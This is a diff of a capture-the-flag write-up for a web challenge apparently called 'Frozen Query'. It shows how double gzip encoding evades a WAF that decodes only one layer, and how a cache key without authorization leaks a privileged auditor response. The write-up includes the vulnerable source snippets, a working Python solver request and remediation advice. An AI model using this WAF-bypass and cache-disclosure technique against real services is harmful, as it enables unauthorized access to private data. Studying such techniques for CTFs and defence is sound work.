@@ -1,52 +1,132 @@
-# Frozen Query — a double-gzip gap between WAF and cache key
+# Frozen Query — double-gzip WAF bypass and cross-authorization cache disclosure
 
 [Русская версия](solve.ru.md)
 
-**Provenance:** The participant's task is confirmed solved by the supplied list, but the exact original conversation payload and flag could not be recovered. The following technical solution was **independently reconstructed** from the published D23R walkthrough (21–22 November 2026): https://dua2z3rr.github.io/posts/Frozen-Query-Walkthrough/ . It documents the same original challenge; it is not falsely presented as a verbatim participant transcript.
+**Challenge:** GlacierCTF 2026 · web / http / cache / rfc10008 · EmberZero · 50 points.  
+**Result:** Solved. The original participant-supplied write-up records a live `HTTP 200`, `X-Cache: HIT` and a cached summit bulletin containing the flag. The participant confirms the flag was accepted on the platform.
 
-## Architecture
+**Provenance:** This write-up was checked against the participant's research archive (`frozen-query.tar.gz` containing the original `scripts/exploit_frozen_query.py`, English/Russian write-ups and extracted source) **and the separate organizer handout** (`frozen-query (1).tar.gz`). The edge and backend Python files match byte-for-byte across both archives. It is therefore no longer merely a reconstruction from a third-party walkthrough.
 
-The Flask application implements `QUERY /api/bulletin`. The summit entry in `src/backend.py` includes a flag and can normally be read only by the auditor, who possesses `AUDIT_TOKEN`.
+## 1. Interface and authentication
 
-A separate background auditor calls the internal endpoint about **every five seconds** with
+The edge proxy, `src/app.py`, listens on port 1337; backend `src/backend.py` listens on loopback port 8000. A normal `GET /api/bulletin` returns `405` and `Allow: QUERY`. Public `QUERY` requests for ordinary regions like `valley` work.
+
+The `summit` bulletin includes the flag. The backend checks `Authorization: Bearer <AUDIT_TOKEN>` for requests whose region is `summit` or requested fields include `flag`, returning 403 otherwise. Only the edge can access the backend directly.
+
+The edge starts a daemon `auditor_loop()` that sends a privileged `QUERY /api/bulletin` approximately every **five seconds**, with body:
 
 ```json
-{"region":"summit","fields":["level","note","flag"],"window":<floor(unix_time/30)>}
+{"region":"summit","fields":["level","note","flag"],"window":0}
 ```
 
-and an authorization header. It bypasses the cache on its own request and primes a cache entry valid for **30 seconds**. Cache entries store HTTP status, headers and body.
+Here `0` is illustrative: in every real request the `window` value is `int(time.time() // 30)`, the current 30-second bucket. The headers include `Authorization`, `Content-Type: application/vnd.glacier.bulletin+json`, `Accept: application/json` and `Cache-Control: no-cache`.
 
-The cache lookup key is SHA-256 of the following four newline-separated strings:
+## 2. Why the auditor's response enters the public cache
 
-```text
-/api/bulletin
-application/json
-application/json
-{"fields":["level","note","flag"],"region":"summit","window":<window>}
+The backend sets `Cache-Control: public, max-age=30` even on an authorized summit response. The edge calculates whether to cache the response using:
+
+```python
+shareable = not request.headers.get("Authorization") or "public" in cc
+if upstream.status_code == 200 and ttl and "no-store" not in cc and shareable:
+    cache_put(key, ttl, upstream.status_code, headers, upstream.content)
 ```
 
-The components are path, normalized Content-Type (vendor media type is normalized to application/json), Accept and canonical JSON (sorted keys, minimal separators). Crucially **the key lacks auditor authorization**, allowing unprivileged cache hits on privileged response bodies.
+Thus `public` makes the authorized response shareable. The auditor's `Cache-Control: no-cache` causes a **cache read bypass** but does **not** prevent this cache write. Every five seconds the process refreshes the cached summit response, with a TTL of 30 seconds.
 
-## Bypass the WAF
+Crucially the cache key **does not include the Authorization header, token identity, or a principal/scope**.
 
-Normal unauthenticated requests are checked before accessing cache. The blocked words include `flag`. With a single gzip layer, the WAF decompresses the data and sees the forbidden key, returning HTTP 403.
+## 3. Matching the key
 
-However, `waf_allows(raw, encoding)` decompresses **only the last gzip coding**; the later `decode_content(raw, encoding)` loops through **every coding**.
+The exact key material comes from `cache_key()`:
 
-Set `Content-Encoding: gzip, gzip` and send `gzip(gzip(plaintext_json))`. The first decompress leaves still-compressed bytes, which are not valid visible JSON and do not contain the literal word `flag`; the WAF allows them. The handler then performs two decompress operations and recovers the auditor's exact JSON before cache-key creation.
+```python
+canonical = json.dumps(json.loads(content), sort_keys=True, separators=(",", ":"))
+material = "\n".join([path, media_type, accept, canonical])
+key = hashlib.sha256(material.encode()).hexdigest()
+```
 
-The auditor's cache entry is reused since authorization is absent from the key. Timing matters: the JSON `window` equals `int(time.time()//30)`, and the auditor refreshes the cache about every five seconds. Retry for a few seconds to hit the primed key.
+The media-type normalizer maps `application/*+json` to `application/json`. To collide with the auditor, match four inputs:
 
-## Reproduction
+| Cache-key component | Required value |
+| --- | --- |
+| Path | `/api/bulletin` |
+| Normalized Content-Type | `application/json` |
+| Accept | `application/json` |
+| Canonical body | `{"fields":["level","note","flag"],"region":"summit","window":CURRENT_BUCKET}` |
 
-See [scripts/solve.py](scripts/solve.py), a **newly written adaptation**, not a copy of the other author's source or of the participant's missing original. Requires `requests` and an explicitly specified challenge deployment URL. It uses HTTP method QUERY, vendor Content-Type, Accept application/json, a double compressed body, and bounded retries.
+Directly sending `summit` and `flag` fails, however, because the non-auditor path runs the WAF **before** cache lookup.
 
-A correct response has HTTP 200, `X-Cache: HIT`, and a summit bulletin with `flag`. A local organizer test may contain the fake `gctf{FAKE_FAKE_FAKE_FAKE_FAKE_FAKE}`; do not confuse this with the accepted competition flag.
+## 4. Why two gzip layers bypass the WAF
 
-## Root cause
+The original source shows two different operations on `Content-Encoding`:
 
-The WAF validates a representation different from the normalized representation that the application consumes, while the cache key is shared across principals. Fix by applying all content decoding once **before validation**, and by preventing private responses from being stored in a cross-user cache or by including a validated authorization scope in the cache key.
+```python
+def waf_allows(body, encoding):
+    codings = parse_codings(encoding)
+    if codings and codings[-1] == "gzip":
+        body = gunzip(body)
+    try:
+        text = json.dumps(json.loads(body))
+    except ValueError:
+        text = body.decode("latin-1")
+    return not any(word in text.lower() for word in ("flag", "summit"))
 
-## Independent source
+def decode_content(body, encoding):
+    for _ in reversed(parse_codings(encoding)):
+        body = gunzip(body)
+    return body
+```
 
-Technical details of WAF and cache semantics: [D23R, Frozen Query Walkthrough — GlacierCTF 2026](https://dua2z3rr.github.io/posts/Frozen-Query-Walkthrough/), published 21 November 2026 and updated 22 November 2026. The present exposition and solver are independent rewording and implementation; no full article or source code has been copied.
+`parse_codings` accepts up to **three** codings and only the value `gzip`. With `Content-Encoding: gzip, gzip` and a body of `gzip(gzip(JSON))`:
+
+1. The WAF gunzips **one** layer, leaving compressed bytes. They are not JSON, and their Latin-1 representation contains no recognizable forbidden words.
+2. The main handler gunzips **both** layers, recovering the real JSON.
+3. The handler computes exactly the same canonical key as the auditor, then consults the cache.
+4. If the auditor has already populated the current window, the response is returned as **`X-Cache: HIT`**. No valid auditor token is supplied by the attacker.
+
+This is a mismatch between the representation validated by a WAF and the representation actually consumed by the application.
+
+## 5. Exploit details
+
+The archived successful solver `scripts/exploit_frozen_query.py` uses `requests` and builds:
+
+```python
+window = int(time.time() // 30)
+body = json.dumps({
+    "region": "summit",
+    "fields": ["level", "note", "flag"],
+    "window": window,
+})
+raw = gzip.compress(gzip.compress(body.encode()))
+headers = {
+    "Content-Type": "application/vnd.glacier.bulletin+json",
+    "Accept": "application/json",
+    "Content-Encoding": "gzip, gzip",
+    "Cache-Control": "max-age=0",
+}
+r = requests.request(
+    "QUERY", "https://frozen-query.web.glacierctf.com/api/bulletin",
+    data=raw, headers=headers, timeout=15,
+)
+```
+
+**Cache-Control matters:** the attacker must **not** send `no-cache`, which would bypass cache lookup and forward an unauthorized request to the backend, returning 403.
+
+The original record observed `HTTP 200`, `X-Cache: HIT`, and a summit bulletin with `level`, `note`, `flag`. A different `window` yielded `MISS`, confirming the importance of matching the canonical body.
+
+For a robust replay, [scripts/solve.py](scripts/solve.py) supports a supplied base URL and bounded retries across the five-second auditor refresh interval and 30-second buckets. The single-request original is retained separately.
+
+## 6. Negative controls
+
+- **Plain JSON:** the edge WAF detects `summit`/`flag` and returns `403 blocked by glacier-edge`.
+- **One gzip:** the WAF fully reveals the plaintext and returns the same 403.
+- **`Cache-Control: no-cache` on the attacking request:** cache lookup is skipped; the backend rejects the unauthenticated summit query.
+- **Wrong window:** cache key mismatch; the archived probe observed `X-Cache: MISS`.
+
+## 7. Root cause and remediation
+
+Two security boundaries fail simultaneously. First, the edge authorizes/cache-partitions insufficiently: a private response marked public is cached under a key independent of auditor identity. Second, WAF decoding is shallower than application decoding. Apply full `Content-Encoding` decoding once before inspection, reject ambiguous encodings, and never share privileged responses through a cache keyed only by public request properties.
+
+## 8. Evidence limits
+
+The uploaded research archive has write-ups and the original attack script, not a separately stored packet-level HTTP capture. Its narrative records a successful live response with a redacted flag beginning `gctf{QU3RY_` and ending `r3qu35t}`. The literal full flag is not present in those uploaded files, so it is not reconstructed or fabricated in public text. **The participant's accepted-solve list establishes platform acceptance.**
